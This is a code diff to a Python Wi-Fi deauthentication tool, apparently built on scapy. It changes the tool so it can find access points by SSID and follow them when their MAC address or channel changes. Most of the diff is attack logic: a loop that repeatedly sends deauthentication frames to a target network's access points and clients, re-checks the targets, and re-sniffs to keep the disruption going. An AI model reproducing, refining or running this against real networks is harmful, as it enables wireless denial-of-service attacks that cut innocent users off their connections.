@@ -27,7 +27,7 @@ class WiFiDeauth():
         self.aps = []
         self.clients = []
         self._existing_aps = []
-        self._current_ap_mac = None
+        self._ap_found = []
 
     def packet_confirms_client(self, pkt):
             return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
@@ -120,18 +120,23 @@ class WiFiDeauth():
         if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
             ap_mac = str(pkt.addr3)
             pkt_ch = self.frequency_to_channel(pkt[RadioTap].Channel)
-            ap = (ap_mac, pkt_ch)
-            if not ap in self._existing_aps and ap[0] == self._current_ap_mac:
+            ssid = pkt[Dot11Elt].info.strip(b'\x00').decode('utf-8').strip() or ap_mac
+            ap = (ap_mac, pkt_ch, ssid)
+            if not ap in self._existing_aps and ssid == self.ssid:
                 self._existing_aps.append(ap)
         
-    def check_existing(self, APs: List[Tuple[str, int]]):
+    def check_existing(self):
+        APs = [(ap["mac"], ap["ch"], ap["ssid"]) for ap in self._ap_found]
         self._existing_aps = []
-        for mac, ch in APs:
+        for _, ch in APs:
             self.set_channel(ch)
-            self._current_ap_mac = mac 
             sniff(prn = self._exists_cb, iface=self.interface, timeout=self.checking_timeout)
         for mac_ch in APs:
             if mac_ch not in self._existing_aps:
+                for idx, ap in enumerate(self._existing_aps):
+                    if ap[1] == mac_ch[1] and ap[0] != mac_ch[0]:
+                        self._ap_found[idx] = {"mac": ap[0], "ch": ap[1], "ssid": ap[2]}
+                        continue
                 return False
         if len(APs) != len(self._existing_aps):
             return False
@@ -139,20 +144,19 @@ class WiFiDeauth():
 
     def deauth_loop(self):
         while True:
-            ap_found = []
-            while not ap_found:
+            self._ap_found = []
+            while not self._ap_found:
                 for ap in self.aps:
                     if ap["ssid"] == self.ssid:
-                        ap_found.append(ap)
-                if ap_found:
+                        self._ap_found.append(ap)
+                if self._ap_found:
                     break
                 print("AP NOT FOUND IN DISCOVERED APs! Sniffing again...")
                 self.sniff_for_aps()
             
-            ap_ch_list = [(ap["mac"], ap["ch"]) for ap in ap_found]
             while True:
                 for _ in range(self.attacks_before_check):
-                    for ap in ap_found:
+                    for ap in self._ap_found:
                         ch = ap["ch"]
                         band = ap["band"]
                         mac = ap["mac"]
@@ -164,7 +168,7 @@ class WiFiDeauth():
                         else:
                             self.send_deauth_client(ap_mac=mac, client_mac=self.client_mac)
                     time.sleep(self.inbetween_packets_sleep)
-                if not self.check_existing(ap_ch_list):
+                if not self.check_existing():
                     print("THE AP HAS CHANGED HIS MAC OR ITS CHANNELS. Sniffing again...")
                     self.sniff_for_aps()
                     break
